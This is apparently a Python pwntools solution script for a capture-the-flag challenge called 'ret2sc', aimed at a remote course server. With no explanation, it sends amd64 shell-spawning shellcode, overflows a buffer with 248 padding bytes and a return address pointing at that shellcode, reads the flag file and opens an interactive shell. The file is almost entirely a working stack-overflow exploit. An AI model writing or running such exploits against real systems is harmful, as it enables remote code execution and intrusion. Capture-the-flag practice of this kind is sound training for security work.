import time
from pwn import *
binary = './ret2sc'
LOCAL = False

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10126)

#elf = ELF(binary)
padding = 'A' * 248
shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64', os='linux')
r.sendline(shellcode)
time.sleep(0.3)
payload = padding + p64(0x601080)
r.sendline(payload)
time.sleep(0.3)
r.sendline('cat /home/ret2sc/flag')

r.interactive()
